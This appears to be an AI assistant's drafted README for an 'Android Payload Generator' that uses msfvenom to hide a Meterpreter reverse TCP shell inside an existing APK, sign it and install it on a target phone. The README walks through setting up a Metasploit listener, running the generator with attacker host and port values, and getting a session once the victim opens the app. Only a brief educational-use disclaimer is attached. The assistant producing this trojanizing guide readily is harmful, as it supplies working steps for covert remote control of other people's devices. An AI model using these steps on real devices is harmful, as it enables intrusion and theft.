Certainly! Below is a professional README template for your tool. This README explains the purpose of the script, provides usage examples, and guides the user through its functionalities.

---

# Android Payload Generator

**Author:** Declanmidd  
**GitHub:** [github.com/Declanmidd](https://github.com/Declanmidd)

## Overview

The **Android Payload Generator** is a tool designed for educational security purposes. It allows users to generate a malicious Android APK that contains a Meterpreter reverse shell payload. This tool utilizes `msfvenom` to embed the payload into an existing APK, making it useful for penetration testing and security research.

**Disclaimer:** This tool is intended for educational use only. Always ensure you have permission to test the target device.

## Features

- Generates a Meterpreter reverse TCP payload.
- Embeds the payload into an existing APK template.
- Signs the APK for successful installation on Android devices.
- Verifies and aligns the APK for optimal performance.

## Requirements

- **Kali Linux** or a similar distribution with Metasploit installed.
- **Java Development Kit (JDK)** for APK signing.
- **Android SDK** tools, specifically `zipalign`.

## Installation

1. **Clone the repository**:
   ```bash
   git clone https://github.com/declanmidd/stealth
   cd stealth
   ```

2. **Make the script executable**:
   ```bash
   chmod +x generate_apk.sh
   ```

## Usage

### Command Syntax

```bash
./generate_apk.sh <LHOST> <LPORT> <TEMPLATE_APK>
```

### Parameters

- `<LHOST>`: The local IP address that the payload will connect back to.
- `<LPORT>`: The port on which the listener will wait for the incoming connection.
- `<TEMPLATE_APK>`: The path to the existing APK that will be used as a template.

### Example

1. **Start Metasploit** to set up a listener:
   ```bash
   msfconsole
   ```

2. **Set up the listener** in Metasploit:
   ```bash
   use exploit/multi/handler
   set payload android/meterpreter/reverse_tcp
   set LHOST <Your Local IP>
   set LPORT <Your Port>
   exploit
   ```

3. **Run the payload generator script**:
   ```bash
   ./generate_apk.sh 192.168.1.10 4444 /path/to/template.apk
   ```

4. **Install the generated APK (`signed_jar.apk`)** on the target Android device.

5. **Once the target device opens the APK**, you should receive a Meterpreter session in your Metasploit console.

## What the Tool Does

- **Generates Payload**: Uses `msfvenom` to create a Meterpreter payload embedded in a specified template APK.
- **Creates Keystore**: Automatically generates a keystore to sign the APK.
- **Signs the APK**: Ensures that the APK is properly signed for installation on Android devices.
- **Verifies and Aligns**: Confirms that the APK is correctly signed and optimized for performance.

## Important Notes

- **Use Responsibly**: Only use this tool on devices and networks you own or have explicit permission to test.
- **Dependencies**: Ensure all required packages are installed before running the script.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
